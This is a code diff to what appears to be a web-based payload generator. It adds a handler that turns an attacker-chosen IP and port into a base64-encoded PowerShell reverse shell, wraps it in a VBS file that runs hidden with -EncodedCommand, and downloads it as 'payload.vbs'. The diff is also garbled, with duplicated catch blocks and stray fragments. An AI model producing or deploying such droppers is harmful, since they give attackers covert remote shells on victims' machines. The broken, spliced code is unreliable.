@@ -157,6 +157,35 @@ document.addEventListener('DOMContentLoaded', function() {
             showModal('Error', `Generation failed: ${e.message}`, true);
         }
     });
+});        } catch (e) {
+            showModal('Error', `Generation failed: ${e.message}`, true);
+        }
+    });
+    
+    document.getElementById('generate-b64').addEventListener('click', () => {
+        const ip = document.getElementById('ip').value.trim();
+        const port = parseInt(document.getElementById('port').value);
+        const filename = document.getElementById('filename').value || 'payload.vbs';
+        
+        if (!ip) return showModal('Error', 'Please enter target IP/Domain', true);
+        if (!validateIpOrDomain(ip)) return showModal('Error', 'Invalid IP/Domain format', true);
+        if (!port || !validatePort(port)) return showModal('Error', 'Port must be between 1 and 65535', true);
+        
+        try {
+            const payload = powershellReverseShell(ip, port);
+            const encoded = btoa(unescape(encodeURIComponent(payload)));
+            const vbsContent = (
+                'Set shell = CreateObject("Wscript.Shell")\n' +
+                `shell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ${encoded}", 0, False\n`
+            );
+            
+            document.getElementById('vbs-output').value = vbsContent;
+            downloadFile(vbsContent, filename);
+            showModal('Success', 'Base64 method VBS generated and saved!');
+        } catch (e) {
+            showModal('Error', `Generation failed: ${e.message}`, true);
+        }
+    });
 });        
         if (!validateIpOrDomain(ip)) {
             showModal('Error', 'Invalid IP/Domain format', true);
